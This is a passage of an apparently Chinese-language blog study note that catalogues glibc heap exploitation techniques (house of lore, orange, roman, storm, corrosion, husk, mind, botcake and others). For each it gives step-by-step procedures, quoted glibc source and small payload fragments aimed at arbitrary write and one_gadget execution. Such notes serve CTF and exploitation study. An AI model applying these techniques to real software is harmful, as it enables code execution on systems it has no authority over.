为很大的数</li><li>分配很大的 <code>chunk</code> 到任意已知地址</li></ul><h3 id="相关技巧-2"><a href="#相关技巧-2" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>注意，在 <code>glibc-2.29</code> 后加入了检测，<code>house of force</code> 基本失效：</p><p><img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250217172739313.png" alt="image-20250217172739313"></p><h3 id="利用效果-2"><a href="#利用效果-2" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址分配</li><li>任意地址读写</li></ul><h2 id="house-of-lore"><a href="#house-of-lore" class="headerlink" title="house of lore"></a>house of lore</h2><h3 id="漏洞成因-3"><a href="#漏洞成因-3" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出、<code>use after free</code>、<code>edit after free</code></p><h3 id="适用范围-3"><a href="#适用范围-3" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>需要泄露或已知地址</li></ul><h3 id="利用原理-3"><a href="#利用原理-3" class="headerlink" title="利用原理"></a>利用原理</h3><p>控制 <code>smallbin</code> 的 <code>bk</code> 指针，示例如下：</p><ul><li>申请 <code>chunk A、chunk B、chunk C</code>，其中 <code>chunk B</code> 大小位于 <code>smallbin</code></li><li>释放 <code>B</code>，申请更大的 <code>chunk D</code>，使得 <code>B</code> 进入 <code>smallbin</code></li><li>写 <code>A</code>，溢出修改 <code>B</code> 的 <code>bk</code>，指向地址 <code>X</code>，这里有 <code>fake chunk</code></li><li>布置 <code>X-&gt;fd == &amp;B</code></li><li>分配两次后即可取出位于 <code>X</code> 地址处的 <code>fake chunk</code></li></ul><h3 id="相关技巧-3"><a href="#相关技巧-3" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>在引入了 <code>tcache stash unlink</code> 的时候，需要注意绕过：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">if</span> USE_TCACHE</span></span><br><span class="line">  <span class="comment">/* While we&#x27;re here, if we see other chunks of the same size,</span></span><br><span class="line"><span class="comment">     stash them in the tcache.  */</span></span><br><span class="line">  <span class="type">size_t</span> tc_idx = <span class="built_in">csize2tidx</span> (nb);</span><br><span class="line">  <span class="keyword">if</span> (tcache &amp;&amp; tc_idx &lt; mp_.tcache_bins)</span><br><span class="line">    &#123;</span><br><span class="line">      mchunkptr tc_victim;</span><br><span class="line"></span><br><span class="line">      <span class="comment">/* While bin not empty and tcache not full, copy chunks over.  */</span></span><br><span class="line">      <span class="keyword">while</span> (tcache-&gt;counts[tc_idx] &lt; mp_.tcache_count</span><br><span class="line">     &amp;&amp; (tc_victim = <span class="built_in">last</span> (bin)) != bin)</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">if</span> (tc_victim != <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      bck = tc_victim-&gt;bk;</span><br><span class="line">      <span class="built_in">set_inuse_bit_at_offset</span> (tc_victim, nb);</span><br><span class="line">      <span class="keyword">if</span> (av != &amp;main_arena)</span><br><span class="line"><span class="built_in">set_non_main_arena</span> (tc_victim);</span><br><span class="line">      bin-&gt;bk = bck;</span><br><span class="line">      bck-&gt;fd = bin;</span><br><span class="line"></span><br><span class="line">      <span class="built_in">tcache_put</span> (tc_victim, tc_idx);</span><br><span class="line">            &#125;</span><br><span class="line">&#125;</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">#<span class="keyword">endif</span></span></span><br></pre></td></tr></table></figure><p>要么使其满足 <code>tc_victim = last (bin)) == bin</code>、要么使其满足：<code>tcache-&gt;counts[tc_idx] ≥ mp_.tcache_count</code>。否则可能会因为非法内存访问使得程序 <code>down</code> 掉。(<strong>对应tcache为空或者满</strong>)</p><p>实际上，这个技巧用得不是很多，因为在同等条件下，更偏向于利用 <code>fastbin/tcachebin</code>。</p><h3 id="利用效果-3"><a href="#利用效果-3" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址分配</li><li>任意地址读写</li></ul><h2 id="house-of-orange"><a href="#house-of-orange" class="headerlink" title="house of orange"></a>house of orange</h2><h3 id="漏洞成因-4"><a href="#漏洞成因-4" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出写</p><h3 id="适用范围-4"><a href="#适用范围-4" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.26</code></li><li><strong>没有 <code>free</code></strong></li><li>可以 <code>unsortedbin attack</code></li></ul><h3 id="利用原理-4"><a href="#利用原理-4" class="headerlink" title="利用原理"></a>利用原理</h3><p><code>house of orange</code> 可以说是开启了堆与 <code>IO</code> 组合利用的先河，是非常经典、漂亮、精彩的利用组合技。利用过程还要结合 <code>top_chunk</code> 的性质，利用过程如下：</p><p><strong>stage1</strong></p><ul><li>申请 <code>chunk A</code>，假设此时的 <code>top_chunk</code> 的 <code>size</code> 为 <code>0xWXYZ</code></li><li>写 <code>A</code>，溢出修改 <code>top_chunk</code> 的 <code>size</code> 为 <code>0xXYZ</code>（需要满足页对齐的检测条件）</li><li>申请一个大于 <code>0xXYZ</code> 大小的 <code>chunk</code>，此时 <code>top_chunk</code> 会进行 <code>grow</code>，并将原来的 <code>old top_chunk</code> 释放进入 <code>unsortedbin</code></li></ul><p><strong>stage2</strong></p><ul><li>溢出写 <code>A</code>，修改处于 <code>unsortedbin</code> 中的 <code>old top_chunk</code>，修改其 <code>size</code> 为 <code>0x61</code>，其 <code>bk</code> 为 <code>&amp;_IO_list_all-0x10</code>，同时伪造好 <code>IO_FILE</code> 结构</li><li>申请非 <code>0x60</code> 大小的 <code>chunk</code> 的时候，首先触发 <code>unsortedbin attack</code>，将<code>_IO_list_all</code> 修改为 <code>main_arena+88</code>，然后 <code>unsortedbin chunk</code> 会进入到 <code>smallbin</code>，大小为 <code>0x60</code>；接着遍历 <code>unsortedbin</code> 的时候触发了 <code>malloc_printerr</code>，然后调用链为：<code> malloc_printerr -&gt; libc_message -&gt; abort -&gt; _IO_flush_all_lockp</code>，调用到伪造的 <code>vtable</code> 里面的函数指针（也可以exit调用之类的，感觉不一定局限于<code>malloc_printerr</code>）</li></ul><h3 id="相关技巧-4"><a href="#相关技巧-4" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>在 <code>glibc-2.24</code> 后加入了 <code>vtable</code> 的 <code>check</code>，不能任意地址伪造 <code>vatble</code> 了，但是可以利用 <code>IO_str_jumps</code> 结构进行利用。</li><li>在 <code>glibc-2.26</code> 后，<code>malloc_printerr</code> 不再刷新 <code>IO</code> 流了，所以该方法失效</li><li>由于<code>_mode</code> 的正负性是随机的，影响判断条件，大概有 <code>1/2</code> 的概率会利用失败，多试几次就好</li></ul><h3 id="利用效果-4"><a href="#利用效果-4" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意函数执行</li><li>任意命令执行</li></ul><h2 id="house-of-rabbit"><a href="#house-of-rabbit" class="headerlink" title="house of rabbit"></a>house of rabbit</h2><h3 id="漏洞成因-5"><a href="#漏洞成因-5" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出写、<code>use after free</code>、<code>edit after free</code></p><h3 id="适用范围-5"><a href="#适用范围-5" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.26</code></li><li>超过 <code>0x400</code> 大小的堆分配</li><li>可以写 <code>fastbin</code> 的 <code>fd</code> 或者 <code>size</code> 域</li></ul><h3 id="利用原理-5"><a href="#利用原理-5" class="headerlink" title="利用原理"></a>利用原理</h3><p>该利用技巧的核心是 <code>malloc_consolidate</code> 函数，当检测到有 <code>fastbin</code> 的时候，会取出每一个 <code>fastbin chunk</code>，将其放置到 <code>unsortedbin</code> 中，并进行合并。以修改 <code>fd</code> 为例，利用过程如下：</p><ul><li>申请 <code>chunk A</code>、<code>chunk B</code>，其中 <code>chunk A</code> 的大小位于 <code>fastbin</code> 范围</li><li>释放 <code>chunk A</code>，使其进入到 <code>fastbin</code></li><li>利用 <code>use after free</code>，修改 <code>A-&gt;fd</code> 指向地址 <code>X</code>，需要伪造好 <code>fake chunk</code>，使其不执行 <code>unlink</code> 或者绕过 <code>unlink</code></li><li>分配足够大的 <code>chunk</code>，或者释放 <code>0x10000</code> 以上的 <code>chunk</code>，只要能触发 <code>malloc_consolidate</code> 即可</li><li>此时 <code>fake chunk</code> 被放到了 <code>unsortedbin</code>，或者进入到对应的 <code>smallbin/largebin</code></li><li>取出 <code>fake chunk</code> 进行读写即可</li></ul><h3 id="相关技巧-5"><a href="#相关技巧-5" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li><code>2.26</code> 加入了 <code>unlink</code> 对 <code>presize</code> 的检查</li><li><code>2.27</code> 加入了 <code>fastbin</code> 的检查</li></ul><p>抓住重点：<code>house of rabbit</code> 是对 <code>malloc_consolidate</code> 的利用。因此，不一定要按照原作者的思路来，他的思路需要满足的条件太多了。</p><h3 id="利用效果-5"><a href="#利用效果-5" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址分配</li><li>任意地址读写</li></ul><h2 id="house-of-roman"><a href="#house-of-roman" class="headerlink" title="house of roman"></a>house of roman</h2><h3 id="漏洞成因-6"><a href="#漏洞成因-6" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p><code>use after free</code>、堆溢出</p><h3 id="适用范围-6"><a href="#适用范围-6" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.29</code></li><li>可以 <code>use after edit</code></li><li>不需要泄露地址</li><li>需要部分字节</li></ul><h3 id="利用原理-6"><a href="#利用原理-6" class="headerlink" title="利用原理"></a>利用原理</h3><ul><li><p>申请chunkA，chunkB，chunkC，chunkD，chunkE，其中chunkB的大小为0xd0</p></li><li><p>在chunkB中写入<code>&quot;A&quot;*0x68+p64(0x61)</code></p></li><li><p>释放掉B，B进入unsortedbin，然后chunkA溢出修改chunkB的size为0x71，此时chunkB的fd和bk都是main_arena+88</p></li><li><p>然后将chunkD和chunkE都释放进fastbin中，size域为0x70的</p></li><li><p>然后利用uaf部分地址写，将chunkB伪造的chunk链入fastbin中</p><figure class="highlight d"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span>x70: <span class="number">0</span>x555555757160 —▸ <span class="number">0</span>x555555757020 —▸ <span class="number">0</span>x7ffff7dd1b78 (main_arena+<span class="number">88</span>) ◂— <span class="number">0</span>x7ffff7dd1b78</span><br></pre></td></tr></table></figure></li><li><p>然后修改chunkB的fd的低2字节，使B-&gt;fd&#x3D; malloc_hook - 0x23</p></li><li><p>然后分配3个chunk的size为0x70的就能获得这个fake chunk了</p></li><li><p>然后在之前就要多分配一个0x70大小的chunk此时来通过uaf修复fastbin（注意堆风水）</p></li><li><p>之后通过unsortedbin attack来修改malloc_hook为一个libcbase+0xXXXX</p></li><li><p>之后部分写malloc_hook的低字节使其偏向onegadget，需要爆破</p></li></ul><h3 id="相关技巧-6"><a href="#相关技巧-6" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>使用 <code>house of roman</code> 的时候，需要采用多线程爆破</li><li>可以使用其他方法代替，比如先攻击 <code>stdout</code> 泄露地址，使得爆破的成本降低</li></ul><h3 id="利用效果-6"><a href="#利用效果-6" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>执行 <code>one_gadget</code></li><li>绕过 <code>ASLR</code></li></ul><h2 id="house-of-storm"><a href="#house-of-storm" class="headerlink" title="house of storm"></a>house of storm</h2><h3 id="漏洞成因-7"><a href="#漏洞成因-7" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出、<code>use after free</code>、<code>edit after free</code></p><h3 id="适用范围-7"><a href="#适用范围-7" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>——<code>2.28</code> 因为2.29的unsortedbin attack失效</li><li>可以进行 <code>unsortedbin attack</code></li><li>可以进行 <code>largebin attack</code>，修改 <code>bk</code> 和 <code>bk_nextsize</code></li><li>可以分配 <code>0x50</code> 大小的 <code>chunk</code></li></ul><h3 id="利用原理-7"><a href="#利用原理-7" class="headerlink" title="利用原理"></a>利用原理</h3><p><code>house of storm</code> 也是一款组合技，利用开启了 <code>PIE</code> 的 <code>x64</code> 程序的堆地址总是 <code>0x55xxxx...</code> 或者 <code>0x56xxxx...</code> 开头这一特性，使用一次 <code>largebin attack</code> 写两个堆地址，使用一次 <code>unsortedbin attack</code> 写一次 <code>libc</code> 地址，可以实现任意地址分配。虽然 <code>house of storm</code> 最后能达到任意地址分配，但是由于其所需的条件比较多，一般可以用其他更简便的堆利用技术代替。利用思路如下：</p><ul><li>进行一次 <code>unsortedbin attack</code>，其 <code>bk</code> 修改为 <code>addr</code></li><li>进行一次 <code>largebin attack</code>，其 <code>bk</code> 修改为 <code>addr+0x10</code>，<code>bk_nextsize</code> 修改为 <code>addr-0x20+3</code></li><li>申请 <code>0x50</code> 大小的 <code>chunk</code> 即可申请到 <code>addr</code> 处</li></ul><h3 id="相关技巧-7"><a href="#相关技巧-7" class="headerlink" title="相关技巧"></a>相关技巧</h3><p>需要注意的有：</p><ul><li>该方法成功的几率是 <code>50%</code>，因为 <code>0x55</code> 会触发 <code>assert</code> 断言，<code>0x56</code> 才能成功</li><li>申请 <code>addr</code> 处的 <code>chunk</code> 的时候需要从 <code>unsortedbin</code> 里面取</li></ul><h3 id="利用效果-7"><a href="#利用效果-7" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址分配</li></ul><h2 id="house-of-corrosion"><a href="#house-of-corrosion" class="headerlink" title="house of corrosion"></a>house of corrosion</h2><h3 id="漏洞成因-8"><a href="#漏洞成因-8" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出、<code>use after free</code></p><h3 id="适用范围-8"><a href="#适用范围-8" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>任意大小分配</li><li>可以修改 <code>global_max_fast</code></li><li>不需要泄露地址</li></ul><h3 id="利用原理-8"><a href="#利用原理-8" class="headerlink" title="利用原理"></a>利用原理</h3><p>一个非常 <code>tricky</code> 的方法，可以绕过 <code>aslr</code>，不需要泄露地址都能达成 <code>rce</code>，可以很很多方法结合起来应用。先说利用原理：</p><ul><li>使用 <code>unsortedbin attack/largebin attack</code> 等方法，成功修改 <code>global_max_fast</code> 的值为很大的值。如果使用 <code>unsortedbin attack</code>，不需要泄露地址，爆破 <code>1/16</code> 即可</li><li>申请任意大小的 <code>chunk</code>，这些 <code>chunk</code> 都会被视为 <code>fastbin chunk</code>，然后利用这些 <code>chunk</code> 来进行读和写</li></ul><p>此时的计算公式为：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">chunk size = (chunk addr - &amp;main_arena.fastbinsY) x <span class="number">2</span> + <span class="number">0x20</span></span><br></pre></td></tr></table></figure><p><strong>原语1：</strong>（任意地址任意写）</p><ul><li><p>假如我们要修改的地址为0x2000上的数据，此时我们的main_arena.fatbinsY的地址是0x1000</p></li><li><p>计算size&#x3D;(0x2000-0x1000)*2+0x20&#x3D;0x2020，所以就要先事先chunkA&#x3D;malloc(0x2018)</p></li><li><p>之后通过unsortedbin attack或者largebin attack，改写global_max_fast</p></li><li><p>此时free掉事先分配好的chunkA，目标地址会指向A<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218153144362.png" alt="image-20250218153144362" style="zoom:50%;" /></p></li><li><p>通过UAF修改A的fd为value，*A&#x3D;value<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218153228419.png" alt="image-20250218153228419" style="zoom: 50%;" /></p></li><li><p>之后再分配回来，value也就成功写入对应的target_addr</p><img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218153328675.png" alt="image-20250218153328675" style="zoom:50%;" /></li></ul><p><strong>原语2：</strong>（转移已经存在的值）</p><ul><li>首先假设目标地址为0x2000，0x3000上存有一个libc地址，fastbinY的地址为0x1000，计算<code>size1=(0x2000-0x1000)*2+0x20=0x2020</code>，<code>size2=(0x3000-0x1000)*2+0x20=0x4020</code></li><li>此时分配两个size都为size1的chunkA和chunkB，并且通过unsortedbin attack或者largebin attack改写global_max_fast</li><li>之后释放掉chunkA和chunkB<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218154308999.png" alt="image-20250218154308999" style="zoom:50%;" /></li><li>通过UAF，部分写chunkA的fd使其指向本身，达到double free类似的效果<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218154357013.png" alt="image-20250218154357013" style="zoom:50%;" /></li><li>再把A给分配回来，同时篡改chunkA的size为size2，释放掉A<img src="C:/Users/Lenovo/AppData/Roaming/Typora/typora-user-images/image-20250218154440828.png" alt="image-20250218154440828" style="zoom:50%;" /></li><li>再次篡改A的size,恢复为size1，然后malloc(size1),就成功完成src-&gt;dst数据的转移</li></ul><h3 id="相关技巧-8"><a href="#相关技巧-8" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>虽然至今都能使用 <code>house of corrosion</code>，但是在 <code>glibc-2.37</code> 版本中，<code>global_max_fast</code> 的数据类型被修改为了 <code>int8_u</code>，进而导致可控的空间范围大幅度缩小。</li><li><code>house of corrosion</code> 也可以拓展到 <code>tcachebin</code> 上</li><li>适当控制 <code>global_max_fast</code> 的大小，把握控制的空间范围</li><li>可以和 <code>IO_FILE</code> 结合起来泄露信息</li></ul><h3 id="利用效果-8"><a href="#利用效果-8" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li><code>glibc</code> 上的地址泄露</li><li>执行 <code>one_gadget</code></li></ul><h2 id="house-of-husk"><a href="#house-of-husk" class="headerlink" title="house of husk"></a>house of husk</h2><h3 id="漏洞成因-9"><a href="#漏洞成因-9" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-9"><a href="#适用范围-9" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li>2.23–2.35</li><li>劫持 <code>__printf_function_table</code> 使其不为空，劫持 <code>__printf_arginfo_table</code> 使其表中存放的 <code>spec</code> 的位置是 <code>backdoor()</code>，执行到 <code>printf</code> 函数时就可以将执行流劫持到 <code>backdoor()</code></li><li>可触发格式化字符串解析</li></ul><blockquote><p>简单来说printf对自定义的格式化字符串的处理优先于默认的格式化字符串处理，我们通过篡改<code>__printf_function_table</code>来使程序认为存在注册过的自定义格式化字符串，从而触发<code>__printf_arginfo_table</code>上的函数指针</p></blockquote><h3 id="利用原理-9"><a href="#利用原理-9" class="headerlink" title="利用原理"></a>利用原理</h3><p>调用处 <code>1</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//</span></span><br><span class="line">  <span class="comment">/* Use the slow path in case any printf handler is registered.  */</span></span><br><span class="line">  <span class="keyword">if</span> (__glibc_unlikely (__printf_function_table != <span class="literal">NULL</span></span><br><span class="line">|| __printf_modifier_table != <span class="literal">NULL</span></span><br><span class="line">|| __printf_va_arg_table != <span class="literal">NULL</span>))</span><br><span class="line">    <span class="keyword">goto</span> do_positional;</span><br><span class="line"></span><br><span class="line"><span class="comment">// vfprintf-internal.c#1763</span></span><br><span class="line">nargs += __parse_one_specmb (f, nargs, &amp;specs[nspecs], &amp;max_ref_arg);</span><br><span class="line"></span><br><span class="line"><span class="comment">// printf-parsemb.c (__parse_one_specmb函数)</span></span><br><span class="line"><span class="comment">/* Get the format specification.  */</span></span><br><span class="line">spec-&gt;info.spec = (<span class="type">wchar_t</span>) *format++;</span><br><span class="line">spec-&gt;size = <span class="number">-1</span>;</span><br><span class="line"><span class="keyword">if</span> (__builtin_expect (__printf_function_table == <span class="literal">NULL</span>, <span class="number">1</span>) <span class="comment">// 判断是否为空</span></span><br><span class="line">  || spec-&gt;info.spec &gt; UCHAR_MAX</span><br><span class="line">  || __printf_arginfo_table[spec-&gt;info.spec] == <span class="literal">NULL</span> <span class="comment">// 判断是否为空</span></span><br><span class="line">  <span class="comment">/* We don&#x27;t try to get the types for all arguments if the format</span></span><br><span class="line"><span class="comment"> uses more than one.  The normal case is covered though.  If</span></span><br><span class="line"><span class="comment"> the call returns -1 we continue with the normal specifiers.  */</span></span><br><span class="line">  || (<span class="type">int</span>) (spec-&gt;ndata_args = (*__printf_arginfo_table[spec-&gt;info.spec]) <span class="comment">// 调用__printf_arginfo_table中的函数指针</span></span><br><span class="line">               (&amp;spec-&gt;info, <span class="number">1</span>, &amp;spec-&gt;data_arg_type,</span><br><span class="line">                &amp;spec-&gt;size)) &lt; <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// ......</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用方式为：</p><ul><li><code>__printf_function_table</code> 和<code>__printf_arginfo_table</code> 分别写为 <code>chunk A</code> 和 <code>chunk B</code> 的地址</li><li>设占位符为 <code>α</code>，此时 <code>chunk B</code> 的内容应该为 <code>p64(0) x ord(α-2) + p64(one_gadget)</code></li></ul><p>调用处 <code>2</code>：</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// vfprintf-internal.c#1962</span></span><br><span class="line"><span class="keyword">if</span> (spec &lt;= UCHAR_MAX</span><br><span class="line">          &amp;&amp; __printf_function_table != <span class="literal">NULL</span></span><br><span class="line">          &amp;&amp; __printf_function_table[(<span class="type">size_t</span>) spec] != <span class="literal">NULL</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="comment">// ......</span></span><br><span class="line"> </span><br><span class="line">      <span class="comment">/* Call the function.  */</span></span><br><span class="line">      function_done = __printf_function_table[(<span class="type">size_t</span>) spec](s, &amp;specs[nspecs_done].info, ptr); <span class="comment">// 调用__printf_function_table中的函数指针</span></span><br><span class="line"> </span><br><span class="line">    <span class="keyword">if</span> (function_done != <span class="number">-2</span>)</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="comment">/* If an error occurred we don&#x27;t have information</span></span><br><span class="line"><span class="comment">         about # of chars.  */</span></span><br><span class="line">      <span class="keyword">if</span> (function_done &lt; <span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">          <span class="comment">/* Function has set errno.  */</span></span><br><span class="line">          done = <span class="number">-1</span>;</span><br><span class="line">          <span class="keyword">goto</span> all_done;</span><br><span class="line">        &#125;</span><br><span class="line"> </span><br><span class="line">      <span class="built_in">done_add</span> (function_done);</span><br><span class="line">      <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>利用方式为：</p><ul><li><code>__printf_function_table</code> 和<code>__printf_arginfo_table</code> 分别写为 <code>chunk A</code> 和 <code>chunk B</code> 的地址</li><li>设占位符为 <code>α</code>，此时 <code>chunk A</code> 的内容应该为 <code>p64(0) x ord(α-2) + p64(one_gadget)</code></li></ul><p>该处调用在高版本被删除。</p><h3 id="相关技巧-9"><a href="#相关技巧-9" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>该技巧一般和 <code>largebin attack</code> 结合起来</li><li>在低于 <code>2.36</code> 版本中，<code>__malloc_assert</code> 中有格式化字符串的解析</li><li>还有一个<code>__printf_va_arg_table</code> 也是可以利用的，但是条件比较苛刻</li></ul><h3 id="利用效果-9"><a href="#利用效果-9" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>执行 <code>one_gadget</code></li><li>执行 <code>rop</code> 控制程序执行流</li></ul><h2 id="house-of-kauri"><a href="#house-of-kauri" class="headerlink" title="house of kauri"></a>house of kauri</h2><h3 id="漏洞成因-10"><a href="#漏洞成因-10" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出</p><h3 id="适用范围-10"><a href="#适用范围-10" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.26</code>——<code>2.32</code></li></ul><h3 id="利用原理-10"><a href="#利用原理-10" class="headerlink" title="利用原理"></a>利用原理</h3><p>利用原理很简单，修改 <code>tcachebin</code> 的 <code>size</code>，然后使其被放到不同大小的 <code>tcachebin</code> 链表里面去。我感觉这个技巧是很基础的 <code>tcachebin</code> 技巧，甚至不应该被称之为 <code>house of</code>。</p><h3 id="相关技巧-10"><a href="#相关技巧-10" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>无</li></ul><h3 id="利用效果-10"><a href="#利用效果-10" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>多个 <code>tcachebin</code> 链表中存放同一个 <code>chunk</code></li></ul><h2 id="house-of-mind"><a href="#house-of-mind" class="headerlink" title="house of mind"></a>house of mind</h2><h3 id="漏洞成因-11"><a href="#漏洞成因-11" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p>堆溢出，<code>edit after free</code></p><h3 id="适用范围-11"><a href="#适用范围-11" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.23</code>—— 至今</li><li>可以分配任意大小的 <code>chunk</code></li><li>程序在子线程执行malloc</li></ul><h3 id="利用原理-11"><a href="#利用原理-11" class="headerlink" title="利用原理"></a>利用原理</h3><ul><li><p>通过多线程或者特定的分配方式，创建一块非主arena的chunkA</p></li><li><p>然后通过chunkA的地址用</p><figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">define</span> heap_for_ptr(ptr) \</span></span><br><span class="line"><span class="meta">  ((heap_info *) ((unsigned long) (ptr) &amp; ~(HEAP_MAX_SIZE - 1)))</span></span><br></pre></td></tr></table></figure><p>该方式计算出<code>heap_for_ptr</code>的地址</p></li><li><p>在<code>heap_info_addr</code>处伪造mstate ar_ptr指针指向攻击者控制的伪造arena区域</p></li><li><p>之后修改chunkA的<code>non_main_arena</code>标志位为1</p></li><li><p>之后释放chunkA，此时arena_for_chunk(A)会通过伪造的<code>heap_info_addr-&gt;ar_ptr</code>找到伪造的arena区域</p></li><li><p>而伪造的arena区域 可以 控制 fastbin 链表头，实现<strong>任意地址分配</strong>，以此实现任意地址写</p></li></ul><h3 id="相关技巧-11"><a href="#相关技巧-11" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>一般来说，可以分配任意大小的 <code>chunk</code>，还能堆溢出，很多技巧都能用</li><li>这个技巧是希望大家关注对于 <code>arena</code> 的攻击</li><li>甚至可以直接修改 <code>thread_arena</code> 这个变量</li></ul><h3 id="利用效果-11"><a href="#利用效果-11" class="headerlink" title="利用效果"></a>利用效果</h3><ul><li>任意地址写任意值</li></ul><h2 id="house-of-botcake"><a href="#house-of-botcake" class="headerlink" title="house of botcake"></a>house of botcake</h2><h3 id="漏洞成因-12"><a href="#漏洞成因-12" class="headerlink" title="漏洞成因"></a>漏洞成因</h3><p><code>double free</code></p><h3 id="适用范围-12"><a href="#适用范围-12" class="headerlink" title="适用范围"></a>适用范围</h3><ul><li><code>2.26</code>—— 至今</li><li>多次释放 <code>chunk</code> 的能力</li></ul><h3 id="利用原理-12"><a href="#利用原理-12" class="headerlink" title="利用原理"></a>利用原理</h3><p>该技巧可以用于绕过 <code>tcache-&gt;key</code> 的检查，利用过程如下：</p><ul><li>申请7个大于size大于0x80的chunk，然后再申请3个，分别为chunkA，chunkB，chunkC（chunkC只是用来隔断<code>top chunk</code>）</li><li>释放前7个chunk进入tcache，之后释放chunkB进入unsortedbin，然后释放chunkA与chunkB合并</li><li>之后从tcache中分配一个chunk</li><li>然后再次释放chunkB，使得chunkB进入tcache，此时chunkB就既位于unsortedbin也位于tcache中</li><li>之后再次申请一个chunk，就得到了chunkB，但是此时的chunkB还位于unsortedbin</li></ul><h3 id="相关技巧-12"><a href="#相关技巧-12" class="headerlink" title="相关技巧"></a>相关技巧</h3><ul><li>在高版本需要绕过指针保护的检查</li></ul><h3 id="利用效果-12"><a href="#利用效果-12" class="headerlink" 